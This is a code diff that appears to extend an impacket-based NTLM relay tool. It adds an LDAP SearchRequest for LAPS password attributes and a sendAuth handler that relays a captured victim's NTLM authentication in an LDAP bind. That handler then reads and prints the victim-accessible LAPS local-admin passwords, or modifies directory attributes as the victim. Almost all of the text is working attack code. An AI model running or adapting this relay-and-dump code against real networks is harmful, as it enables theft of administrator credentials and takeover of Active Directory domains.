@@ -1,0 +1,138 @@
+
+from impacket.ldap.ldapasn1 import (
+    BindRequest, LDAPMessage, ModifyRequest, ResultCode,
+    SearchRequest, Scope, DereferAliases, Filter, Present,
+    Attributes, AttributeDescription,
+)
+
+LAPS_ATTRS = [
+    "ms-Mcs-AdmPwd",
+    "msLAPS-EncryptedPassword",
+    "msLAPS-Password",
+    "msLAPS-EncryptedPasswordHistory",
+]
+
+
+def build_laps_search_request(target_dn):
+    """base-scope SearchRequest שמבקש את התכונות של LAPS."""
+    request = SearchRequest()
+    request["baseObject"] = target_dn
+    request["scope"] = Scope("baseObject")          # 0
+    request["derefAliases"] = DereferAliases("neverDerefAliases")
+    request["sizeLimit"] = 0
+    request["timeLimit"] = 0
+    request["typesOnly"] = False
+
+    present = Present()
+    present["attributeDescription"] = "objectClass"  # (objectClass=*)
+    filt = Filter()
+    filt.setComponentByName("present", present)
+    request["filter"] = filt
+
+    attrs_set = Attributes()
+    for attr in LAPS_ATTRS:
+        attrs_set.append(AttributeDescription(attr))
+    request["attributes"] = attrs_set
+    return request
+
+
+
+payload.add_argument("-read-laps", action="store_true",
+                     help="read LAPS attributes from -modify-dn instead of writing")
+
+
+
+def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
+    token = authenticateMessageBlob
+    if unpack("B", token[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
+        token = SPNEGO_NegTokenResp(token)["ResponseToken"]
+    type3 = ntlm.NTLMAuthChallengeResponse()
+    type3.fromString(token)
+    encoding = "utf-16le" if type3["flags"] & ntlm.NTLMSSP_NEGOTIATE_UNICODE else "ascii"
+    victim = "%s\\%s" % (
+        type3["domain_name"].decode(encoding),
+        type3["user_name"].decode(encoding),
+    )
+    if expected_victim and victim.casefold() != expected_victim.casefold():
+        print(f"[-] Rejected unexpected victim {victim}", flush=True)
+        return None, STATUS_ACCESS_DENIED
+
+    final = SPNEGO_NegTokenResp()
+    final["ResponseToken"] = token
+    if len(authenticateMessageBlob) >= 20 and authenticateMessageBlob[-20:-16] == b"\xa3\x12\x04\x10":
+        final["mechListMIC"] = authenticateMessageBlob[-16:]
+
+    bind_message = ldap_message(gss_token(final.getData()))
+
+    if args.read_laps:
+        op_message = ldap_message(build_laps_search_request(args.modify_dn))
+        op_label = "SearchRequest(LAPS)"
+    else:
+        attribute, value = operation_value()
+        op_message = ldap_message(replace_attribute(attribute, value))
+        op_label = f"ModifyRequest({attribute})"
+
+    record = bind_message + op_message
+    wire = self.raw.encrypt(record)
+    self.raw._socket.sendall(wire)
+    print(f"[+] Sent same-record frame: victim={victim} op={op_label} dn={args.modify_dn}",
+          flush=True)
+
+    try:
+        length = struct.unpack(">I", read_exact(self.raw._socket, 4))[0]
+        plaintext = self.raw.decrypt(struct.pack(">I", length)
+                                     + read_exact(self.raw._socket, length))
+
+     
+        laps_results = {}
+        remainder = plaintext
+        while remainder:
+            message, remainder = decoder.decode(remainder, asn1Spec=LDAPMessage())
+            op = message["protocolOp"].getComponent()
+            name = op.getName()
+
+            if name == "bindResponse":
+                print(f"[+]   Bind -> {op['resultCode'].prettyPrint()} "
+                      f"{bytes(op['diagnosticMessage']).decode(errors='replace')[:80]}",
+                      flush=True)
+            elif name == "searchResEntry":
+                for partial in op["attributes"]:
+                    attr_name = str(partial["type"])
+                    for val in partial["vals"]:
+                        laps_results.setdefault(attr_name, []).append(val.asOctets())
+            elif name == "searchResDone":
+                print(f"[+]   SearchDone -> {op['resultCode'].prettyPrint()}", flush=True)
+            elif name == "modifyResponse":
+                print(f"[+]   Modify -> {op['resultCode'].prettyPrint()} "
+                      f"{bytes(op['diagnosticMessage']).decode(errors='replace')[:80]}",
+                      flush=True)
+
+        if args.read_laps:
+            if laps_results:
+                print(f"[+] LAPS DUMP for {args.modify_dn}:", flush=True)
+                for attr, vals in laps_results.items():
+                    for v in vals:
+                        if isinstance(v, bytes):
+                            if attr == "ms-Mcs-AdmPwd":
+                                try:
+                                    print(f"     {attr}: {v.decode()}", flush=True)
+                                except UnicodeDecodeError:
+                                    print(f"     {attr} (hex): {v.hex()}", flush=True)
+                            elif attr.startswith("msLAPS-Encrypted"):
+                              
+                                print(f"     {attr} ({len(v)} bytes, hex head): {v[:64].hex()}",
+                                      flush=True)
+                            else:
+                            
+                                try:
+                                    print(f"     {attr}: {v.decode('utf-16le')}", flush=True)
+                                except UnicodeDecodeError:
+                                    print(f"     {attr} (raw): {v!r}", flush=True)
+            else:
+                print(f"[-] No LAPS attributes returned — victim lacks READ permission "
+                      f"on the object, or LAPS not configured.", flush=True)
+
+    except Exception as error:
+        print(f"[!] response unavailable: {type(error).__name__}: {error}", flush=True)
+
+    return None, STATUS_ACCESS_DENIED
